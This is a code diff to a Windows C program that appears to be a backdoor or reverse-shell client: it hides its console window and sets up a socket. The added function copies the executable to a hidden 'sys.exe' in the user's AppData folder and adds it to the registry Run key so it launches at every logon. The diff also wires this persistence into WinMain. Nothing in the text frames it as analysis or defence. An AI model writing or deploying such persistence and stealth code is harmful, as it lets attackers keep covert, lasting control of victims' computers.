@@ -16,6 +16,30 @@
 
 int sock;
 
+void copy_to_appdata() {
+    char appdata_path[MAX_PATH];
+    char exe_path[MAX_PATH];
+    char dest_path[MAX_PATH];
+    char command[MAX_PATH + 20];
+    
+    GetModuleFileName(NULL, exe_path, MAX_PATH);
+    GetEnvironmentVariable("APPDATA", appdata_path, MAX_PATH);
+    
+    snprintf(dest_path, sizeof(dest_path), "%s\\sys.exe", appdata_path);
+    
+    CopyFile(exe_path, dest_path, FALSE);
+    
+    snprintf(command, sizeof(command), "attrib +h \"%s\"", dest_path);
+    system(command);
+    
+    HKEY NewVal;
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) == ERROR_SUCCESS) {
+        DWORD pathLenInBytes = strlen(dest_path) * sizeof(char);
+        RegSetValueEx(NewVal, TEXT("sys"), 0, REG_SZ, (LPBYTE)dest_path, pathLenInBytes);
+        RegCloseKey(NewVal);
+    }
+}
+
 int bootRun()
 {
     char err[128] = "Failed\n";
@@ -279,6 +303,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
+
+    copy_to_appdata();
 
     struct sockaddr_in ServAddr;
     WSADATA wsaData;
